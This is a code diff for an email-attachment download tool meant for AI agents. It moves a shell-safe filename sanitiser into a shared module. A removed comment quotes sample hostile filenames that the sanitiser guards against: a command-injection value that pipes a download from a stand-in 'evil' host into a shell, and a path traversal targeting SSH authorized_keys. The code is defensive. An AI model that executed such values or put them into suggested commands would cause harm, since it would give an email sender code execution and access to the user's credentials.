@@ -18,26 +18,12 @@ import {
 
 import { TICKET_TTL_HOURS, type TicketInput, type TicketStore } from '../attachments/tickets.ts'
 import { READ_ONLY } from './annotations.ts'
-import { formatSize } from './format.ts'
+import { formatSize, shellSafeFilename } from './format.ts'
 import { errorResult, type ToolResult, textResult } from './result.ts'
 
 // We only need the `attachments` metadata from the Email/get; the detail
 // call always resolves text bodies, so cap them to almost nothing.
 const METADATA_BODY_VALUE_BYTES = 16
-
-// Characters that could break out of the single-quoted curl example or
-// steer the write path: quotes, backslashes, path separators, controls.
-const SHELL_UNSAFE_RE = /[\p{Cc}'"\\/]/gu
-const LEADING_DOTS_RE = /^\.+/u
-
-// The curl example is text an agent may run verbatim, and the filename comes
-// from the incoming email — i.e. from an arbitrary sender. A name like
-// `x'; curl evil | sh; '` or `../../.ssh/authorized_keys` must not survive
-// into the suggested command.
-const shellSafeFilename = (name: string): string => {
-  const cleaned = name.replaceAll(SHELL_UNSAFE_RE, '_').replace(LEADING_DOTS_RE, '').trim()
-  return cleaned || 'attachment'
-}
 
 const downloadAttachmentShape = {
   blobId: z
@@ -97,7 +83,7 @@ export const downloadAttachment = async (
       `Download URL (expires in ${TICKET_TTL_HOURS} hours):\n` +
       `${url}\n\n` +
       'Save it straight to a file, e.g.:\n' +
-      `  curl -sS -o '${shellSafeFilename(name)}' '${url}'\n` +
+      `  curl -sS -o '${shellSafeFilename(name, 'attachment')}' '${url}'\n` +
       'Do not fetch this URL into the conversation — the file may be large.'
   )
 }
@@ -128,7 +114,8 @@ export const registerDownloadAttachment = (
         'plus an HTTPS URL — never the file content. Save the file to disk ' +
         "out-of-band, e.g. `curl -sS -o '<filename>' '<url>'`; do not fetch " +
         'the URL into the conversation, the file may be large. The URL ' +
-        `expires after ${TICKET_TTL_HOURS} hours — re-call this tool for a fresh one.`,
+        `expires after ${TICKET_TTL_HOURS} hours — re-call this tool for a fresh one. ` +
+        'For the whole message as an .eml file use download_email instead.',
       inputSchema: downloadAttachmentShape,
       title: 'Download attachment',
     },
